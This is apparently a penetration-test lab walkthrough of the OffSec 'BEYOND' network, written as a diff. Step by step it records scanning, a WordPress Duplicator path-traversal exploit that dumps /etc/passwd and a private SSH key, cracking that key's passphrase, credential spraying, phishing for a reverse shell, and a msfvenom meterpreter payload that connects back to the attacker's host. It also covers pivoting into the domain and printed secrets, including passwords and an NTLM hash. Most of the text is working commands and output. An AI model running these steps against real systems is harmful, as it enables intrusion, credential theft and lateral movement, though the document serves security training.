@@ -1,0 +1,838 @@
+WEBSRV1 OS Credentials: 192.168.209.244
+MAILSRV1 OS Credentials: 192.168.209.242
+
+#First enumerate the mailserver with Nmap and save in the file mailserver/nmap
+sudo nmap -sC -sV -oN mailserver/nmap 192.168.209.242
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 08:14 CET
+Nmap scan report for 192.168.209.242
+Host is up (0.039s latency).
+Not shown: 992 closed tcp ports (reset)
+PORT    STATE SERVICE       VERSION
+25/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+110/tcp open  pop3          hMailServer pop3d
+|_pop3-capabilities: USER UIDL TOP
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp open  imap          hMailServer imapd
+|_imap-capabilities: completed NAMESPACE IDLE CAPABILITY OK QUOTA SORT IMAP4 RIGHTS=texkA0001 ACL CHILDREN IMAP4rev1
+445/tcp open  microsoft-ds?
+587/tcp open  smtp          hMailServer smtpd
+| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-11-01T07:14:46
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.90 seconds
+
+#Enumerate webserver with Nmap and save in the file webserver/nmap
+sudo nmap -sC -sV -oN webserver/nmap 192.168.209.244
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 08:17 CET
+Nmap scan report for 192.168.209.244
+Host is up (0.046s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
+|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-title: BEYOND Finances &#8211; We provide financial freedom
+|_Requested resource was http://192.168.209.244/main/
+|_http-generator: WordPress 6.0.2
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
+                                                             
+#start searching for vulnerabilities in all open ports and services
+#Let's the WordPress website hosted on the webserver port 80 using wpscan and save the output on webserver/wpscan
+
+After analysing the output of the wpscan, we found some outdated plugins
+We went for the duplicator plugin
+
+searchsploit duplicator
+------------------------------------- ---------------------------------
+ Exploit Title                       |  Path
+------------------------------------- ---------------------------------
+WordPress Plugin Duplicator - Cross- | php/webapps/38676.txt
+WordPress Plugin Duplicator 0.5.14 - | php/webapps/36735.txt
+WordPress Plugin Duplicator 0.5.8 -  | php/webapps/36112.txt
+WordPress Plugin Duplicator 1.2.32 - | php/webapps/44288.txt
+Wordpress Plugin Duplicator 1.3.26 - | php/webapps/49288.rb
+Wordpress Plugin Duplicator 1.3.26 - | php/webapps/50420.py
+WordPress Plugin Duplicator 1.4.6 -  | php/webapps/50992.txt
+WordPress Plugin Duplicator 1.4.7 -  | php/webapps/50993.txt
+WordPress Plugin Duplicator < 1.5.7. | php/webapps/51874.py
+WordPress Plugin Multisite Post Dupl | php/webapps/40908.html
+------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+We went for the Wordpress Plugin Duplicator 1.3.26 - | php/webapps/50420.py because it relates to the version of plugin we saw.
+searchsploit -x 50420 to know about the exploit usage
+searchsploit -m 50420 to save the exploit to our local PC
+
+#execute the exploit
+
+50420.py http://192.168.209.244 /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
+marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
+
+The output shows that we discorvered 2 existing users Daniela and Marcus, therefore, we will execute the exploit again to search for their ssh puplic keys
+
+#for Marcus
+python3 50420.py http://192.168.209.244 /home/marcus/.ssh/id_rsa
+Invalid installer file name!!
+
+The output shows, he does not connect to the server using ssh
+
+#lets check for Daniela
+
+python3 50420.py http://192.168.209.244 /home/daniela/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+QduOTpMIvVMIJcfeYF1GJ4ggUG4=
+-----END OPENSSH PRIVATE KEY-----
+
+lets copy the puplic key we found and save it in the folder /webserver/Daniela/id_rsa we will try to login with the ssh key to impersonate daniela
+
+──(kali㉿kali)-[~/beyond/webserver]
+└─$ nano id_rsa  
+                                                                                                                                          
+┌──(kali㉿kali)-[~/beyond/webserver]
+└─$ sudo chmod 700 id_rsa                               
+[sudo] password for kali: 
+                                                                       
+┌──(kali㉿kali)-[~/beyond/webserver]
+└─$ ssh -i id_rsa daniela@192.168.209.244
+The authenticity of host '192.168.209.244 (192.168.209.244)' can't be established.
+ED25519 key fingerprint is SHA256:vhxi+CCQgvUHPEgu5nTN85QQZihXqJCE34zq/OU48VM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '192.168.209.244' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+
+This shows that daniella secured his ssh key with a passphrase when generating it.
+
+#let's attempt to crack it
+                                                                      
+┌──(kali㉿kali)-[~/beyond/webserver]
+└─$ ssh2john id_rsa > ssh.hash   
+
+──(kali㉿kali)-[~/beyond/webserver]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tequieromucho    (id_rsa)     
+1g 0:00:00:31 DONE (2024-11-01 09:51) 0.03215g/s 45.27p/s 45.27c/s 45.27C/s jesse..tagged
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+After cracking it using ssh2john and john, we got the plaintext password tequieromucho
+
+Lets use it and login via ssh as daniella
+
+┌──(kali㉿kali)-[~/beyond/webserver]
+└─$ ssh -i id_rsa daniela@192.168.209.244                    
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Nov  1 08:57:49 AM UTC 2024
+
+  System load:  0.0390625         Processes:               210
+  Usage of /:   73.7% of 8.02GB   Users logged in:         0
+  Memory usage: 23%               IPv4 address for ens192: 192.168.209.244
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+13 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
+daniela@websrv1:~$ 
+
+We got our initial foothold into the network as Daniela
+
+let's use the linPEAS automated Linux enumeration script to obtain a broad variety of information and identify any potential low hanging fruit.
+
+We downloaded it from GitHub with this command wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+
+#started a python 3 server on the downloaded directory
+python3 -m http.server 80
+
+on our open Daniela shell, we used the command
+wget http://192.168.45.187/linpeas_linux_amd64 #to collect the file
+chmod +x linpeas_linux_amd64 #to change the file to executable
+./ linpeas_linux_amd64 #to execute the command
+
+started analysing the output for privilege escalation
+
+first, the network shows only one interface
+══════════════════════════════╣ Network Information ╠══════════════════════════════                                                           
+                              ╚═════════════════════╝                  
+╔══════════╣ Interfaces
+# symbolic names for networks, see networks(5) for more information    
+link-local 169.254.0.0
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:9e:35:40 brd ff:ff:ff:ff:ff:ff
+    altname enp11s0
+    inet 192.168.209.244/24 brd 192.168.209.255 scope global ens192
+       valid_lft forever preferred_lft forever
+
+
+Sudo permissions, daniella is allowed to run 
+Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                              
+Matching Defaults entries for daniela on websrv1:                      
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User daniela may run the following commands on websrv1:
+    (ALL) NOPASSWD: /usr/bin/git
+
+We also found another important file with a plain password in description
+══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                                             
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpress' );
+define( 'DB_PASSWORD', 'DanielKeyboard3311' );
+define( 'DB_HOST', 'localhost' );
+
+
+#Because the compromised user was allowed to run the git command with sudo privilege, we move to the wodpress server directory to list their git commit
+
+daniela@websrv1:/srv/www/wordpress$ sudo git log
+commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:24:28 2022 +0000
+
+    initial commit
+
+daniela@websrv1:/srv/www/wordpress$ sudo git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
+commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+diff --git a/fetch_current.sh b/fetch_current.sh
+deleted file mode 100644
+index 25667c7..0000000
+--- a/fetch_current.sh
++++ /dev/null
+@@ -1,6 +0,0 @@
+-#!/bin/bash
+-
+-# Script to obtain the current state of the web app from the staging server
+-
+-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
+
+ 
+#we saved all the username and passwords we have gathered so far and ran it against the mailserver using crackmapexec
+crackmapexec smb 192.168.209.242 -u username.txt -p password.txt --continue-on-success
+
+ SMB         192.168.209.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
+
+shows john is a domain username and can access shares on the mailserver machine and the machine is attached to a domain because of this beyond.com\
+
+#However, since based on our earlier nmap scan, we can not have access to the machine via rdp, we can only leverage john's credential and use it for a phishing campaign.
+
+Before that we also ran this command to see if john have access to any shares, but we only noticed that john's access is only to the default shares
+crackmapexec smb 192.168.209.242 -u john -p "dqsTwTpZPn#nL" --shares
+
+ The output shows john only have access to the default share. We only leveraged phishing email.
+
+#We can prepare a phishing email using the configuration in the offsec training manual
+We sent a phishing email to Marcus and Daniela through john's account and Marcus clicked on our phishing email and gave us a reverse reverse shell into CLIENTWK1 as a user.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.152] from (UNKNOWN) [192.168.192.242] 63859
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
+whoami
+beyond\marcus
+PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.148.243
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.148.254
+
+IPconfig shows that this is a domain PC attached into an internal network 172.16.148.243/24
+
+#To enumarate the client PC further we transferred winpeas to the PC and executed it.
+
+PS C:\Users\marcus> iwr -uri http://192.168.45.152:8000/winPEASx64.exe -Outfile winPEAS.exe
+PS C:\Users\marcus> .\winPEAS.exe
+          ͹ Network Ifaces and known hosts
+  The masks are only for the IPv4 addresses 
+    Ethernet0[00:50:56:9E:6C:A5]: 172.16.148.243 / 255.255.255.0
+        Gateways: 172.16.148.254
+        DNSs: 172.16.148.240
+        Known hosts:
+          172.16.148.240        00-50-56-9E-DF-67     Dynamic
+          172.16.148.254        00-50-56-9E-E8-1D     Dynamic
+
+          ͹ Looking for Kerberos tickets
+   https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+    serverName: krbtgt/BEYOND.COM
+    RealmName: BEYOND.COM
+    StartTime: 11/2/2024 2:34:47 AM
+    EndTime: 11/2/2024 12:14:15 PM
+    RenewTime: 11/9/2024 1:14:15 AM
+    EncryptionType: aes256_cts_hmac_sha1_96
+    TicketFlags: name_canonicalize, pre_authent, renewable, forwarded, forwardable
+   =================================================================================================                                          
+
+    serverName: krbtgt/BEYOND.COM
+    RealmName: BEYOND.COM
+    StartTime: 11/2/2024 2:14:15 AM
+    EndTime: 11/2/2024 12:14:15 PM
+    RenewTime: 11/9/2024 1:14:15 AM
+    EncryptionType: aes256_cts_hmac_sha1_96
+    TicketFlags: name_canonicalize, pre_authent, initial, renewable, forwardable
+   =================================================================================================                                          
+
+    serverName: cifs/DCSRV1.beyond.com
+    RealmName: BEYOND.COM
+    StartTime: 11/2/2024 2:34:47 AM
+    EndTime: 11/2/2024 12:14:15 PM
+    RenewTime: 11/9/2024 1:14:15 AM
+    EncryptionType: aes256_cts_hmac_sha1_96
+    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+   =================================================================================================                                          
+
+    serverName: ldap/DCSRV1.beyond.com
+    RealmName: BEYOND.COM
+    StartTime: 11/2/2024 2:34:47 AM
+    EndTime: 11/2/2024 12:14:15 PM
+    RenewTime: 11/9/2024 1:14:15 AM
+    EncryptionType: aes256_cts_hmac_sha1_96
+    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+   =================================================================================================         
+
+Enumerating Security Packages Credentials
+  Version: NetNTLMv2
+  Hash:    marcus::BEYOND:1122334455667788:51bc69611018f95bb3c6662117bfa925:0101000000000000b0432c860a2ddb01ce1fbb2474c6f51b000000000800300030000000000000000000000000200000c949168f0f20db4741c5e0241af0f0236f6caa2759784eb0a73547d1aaafb00b0a00100000000000000000000000000000000000090000000000000000000000  
+
+          ͹ Found Misc-Passwords1 Regexes
+C:\Users\marcus\Documents\exec.ps1: password = "DefrostNewsySupply5544"
+
+          ͹ Found Misc-Usernames Regexes
+C:\Users\marcus\Documents\exec.ps1: username = "marcus"
+
+# We found some other internal IPs associated with computers and we also noticed that the DC is DCSRV1.beyond.com
+PS C:\Users\marcus> nslookup DCSRV1.beyond.com
+nslookup DCSRV1.beyond.com
+Server:  UnKnown
+Address:  172.16.148.240
+
+Name:    DCSRV1.beyond.com
+Address:  172.16.148.240
+
+Nslookup up on shows that it is associated with the earlier identified internal IP 
+So, we can summaries
+
+DCSRV1.beyond.com 172.16.148.240
+CLIENTWK1         172.16.148.243
+                  172.16.148.254
+
+Knowing fully now that we are inside the domain, we have to import PowerView.PS1 to use it for the AD enumeration
+PS C:\users\marcus> iwr -uri http://192.168.45.152:8000/PowerView.ps1 -Outfile PowerView.ps1
+iwr -uri http://192.168.45.152:8000/PowerView.ps1 -Outfile PowerView.ps1
+PS C:\users\marcus> Import-Module .\PowerView.ps1
+Import-Module .\PowerView.ps1
+
+PS C:\users\marcus> Get-NetDomain
+Get-NetDomain
+
+
+Forest                  : beyond.com
+DomainControllers       : {DCSRV1.beyond.com}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : 
+PdcRoleOwner            : DCSRV1.beyond.com
+RidRoleOwner            : DCSRV1.beyond.com
+InfrastructureRoleOwner : DCSRV1.beyond.com
+Name                    : beyond.com
+
+Get-NetUser provided the following domain users
+
+Administrator@beyond.com  (Admin group)
+krbtgt@beyond.com
+john@beyond.com
+daniela@beyond.com
+marcus@beyond.com
+beccy@beyond.com          (Admin group)
+
+
+Get-NetComputer provided the following computers, we also performed nslookup on all of them to get their ips
+
+PS C:\users\marcus> Get-NetComputer | select operatingsystem,dnshostname
+Get-NetComputer | select operatingsystem,dnshostname
+
+operatingsystem              dnshostname            
+---------------              -----------            
+Windows Server 2022 Standard DCSRV1.beyond.com              172.16.148.240  
+Windows Server 2022 Standard MAILSRV1.beyond.com            172.16.148.254
+Windows 11 Enterprise        CLIENTWK1.beyond.com           172.16.148.243
+Windows Server 2022 Standard internalsrv1.beyond.com        172.16.148.241
+
+To scan those machines further, we have to connect the domain network to our kali network then use proxychain
+To achieve that we have to connect to the compromise machine using metasploit
+
+Generated a meterpreter payload
+┌──(kali㉿kali)-[~/beyond]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.152 LPORT=443 -f exe -o met.exe
+ 
+transfered the file to the compromised machine
+
+PS C:\users\marcus> iwr -uri http://192.168.45.152:8000/met.exe -Outfile met.exe
+
+Then started a metapreter multi handler section and saved it on the background with run -j
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole -q
+[sudo] password for kali: 
+msf6 > 
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.45.152
+LHOST => 192.168.45.152
+msf6 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf6 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf6 exploit(multi/handler) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.45.152:443
+
+immediately we executed the met.exe file, we got a session in our meterprter shell
+
+msf6 exploit(multi/handler) > [*] Sending stage (201798 bytes) to 192.168.192.242
+[*] Meterpreter session 1 opened (192.168.45.152:443 -> 192.168.192.242:64760) at 2024-11-02 13:00:40 +0100
+
+We used autoroute to route the domain network traffic to ou kali
+
+msf6 exploit(multi/handler) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set session 1
+session => 1
+msf6 post(multi/manage/autoroute) > run
+
+[*] Running module against CLIENTWK1
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.16.148.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > run -j
+[*] Auxiliary module running as background job 1.
+
+[*] Starting the SOCKS proxy server
+
+#To find out that our connection worked, we use
+┌──(kali㉿kali)-[~/beyond]
+└─$ ss -ntplu
+Netid   State    Recv-Q   Send-Q       Local Address:Port        Peer Address:Port   Process                                                                              
+udp     UNCONN   0        0                  0.0.0.0:48570            0.0.0.0:*                                                                                           
+tcp     LISTEN   0        256         192.168.45.152:443              0.0.0.0:*                                                                                           
+tcp     LISTEN   0        256              127.0.0.1:1080             0.0.0.0:*     
+
+#make sure your proxychain configuration is same as 127.0.0.1:1080
+
+we started the network scans on the domain computers
+
+We first enumerated for smb shares that the users we found their credentials has in those PC, but the all have access only to the default shares
+┌──(kali㉿kali)-[~]
+└─$ proxychains -q crackmapexec smb 172.16.148.240-241 172.16.148.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
+/usr/lib/python3/dist-packages/cme/cli.py:35: SyntaxWarning: invalid escape sequence '\ '
+  """,
+/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
+  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
+/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
+  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
+/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
+  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
+  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+SMB         172.16.148.240  445    DCSRV1           [*] Windows Server 2022 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
+SMB         172.16.148.254  445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
